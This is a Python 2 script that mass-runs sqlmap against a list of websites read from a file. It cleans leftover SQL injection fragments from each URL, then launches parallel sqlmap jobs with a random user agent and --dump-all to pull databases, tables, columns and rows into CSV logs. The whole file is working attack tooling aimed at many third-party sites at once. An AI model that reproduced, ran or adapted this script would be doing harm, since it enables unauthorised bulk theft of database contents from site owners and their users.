from random import randint
from functools import partial
from multiprocessing.dummy import Pool
from subprocess import call
import os
from fnmatch import fnmatch
import glob, shutil

# SETTINGS #

sqlmap_threads = 10
sqlmap_list_name = "site.txt"
sqlmap_max_lines = 10

sites = []

# SETTINGS #

f = open(sqlmap_list_name, 'r').readlines()

def gen_limitStart_limitStop():
    return (randint(200, 5000))

def load_sites_list():

    try:


        with open(sqlmap_list_name) as sites_list:
            c = 0
            for url in sites_list:

                c += 1 
                #print c

                try:
                    url = url.replace("\n", "").split('999')[0]
                except: pass

                try:
                    url = url.replace("\n", "").split('[t]')[0]
                except: pass

                try:
                    url = url.replace("\n", "").split("' and")[0]
                except: pass

                try:
                    url = url.replace("\n", "").split("' or")[0]
                except: pass

                try:
                    url = url.replace("\n", "").split(' or')[0] 
                except: pass
                
                get_limits = gen_limitStart_limitStop()
                sites.append('title LEFT: ' + str(len(f) - c) + '& sqlmap.py -u "' + url + "1*" + '"' + ' --batch --random-agent --dbs --tables --columns --dump-all --technique=EU --dump-format=CSV --output-dir=logs --timeout=15 --threads=' + str(sqlmap_threads) + ' --start=' + str(get_limits) + ' --stop=' + str(get_limits + sqlmap_max_lines))
    
    except Exception, e: print e

def main():

    try:

        pool = Pool(3)

        for i, returncode in enumerate(pool.imap(partial(call, shell=True), sites)):
            if returncode != 0:
                print("%d failed: %d" % (i, returncode))

    except Exception, error: 
        print error 
        pass

load_sites_list()
main()